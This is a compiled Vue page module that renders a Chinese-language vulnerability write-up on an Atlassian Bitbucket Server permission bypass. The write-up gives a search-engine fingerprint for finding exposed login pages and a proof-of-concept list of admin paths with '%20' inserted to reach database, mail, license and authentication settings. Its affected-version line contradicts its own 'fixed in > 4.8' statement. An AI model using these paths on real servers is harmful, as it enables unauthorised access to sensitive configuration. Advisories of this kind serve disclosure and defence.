import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as n}from"./app-58e4a7d6.js";const t={},d=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>此错误已修复并部署在 Bitbucket Server &gt; 4.8 上。Bitbucket 由 Atlassian 团队开发。其中出现了一个通过 %20 绕过权限的漏洞，导致任意用户可获取敏感数据</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Bitbucket Server &gt; 4.8
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;Log in - Bitbucket&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241429046.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/admin%20/mail-server
/admin%20/db
/admin%20/db/edit
/admin%20/license
/admin%20/logging
/admin%20/server-settings
/admin%20/authentication
/admin%20/avatars
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241429345.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,12),s=[d];function r(l,c){return a(),i("div",null,s)}const m=e(t,[["render",r],["__file","Atlassian Bitbucket 登录绕过漏洞.html.vue"]]);export{m as default};
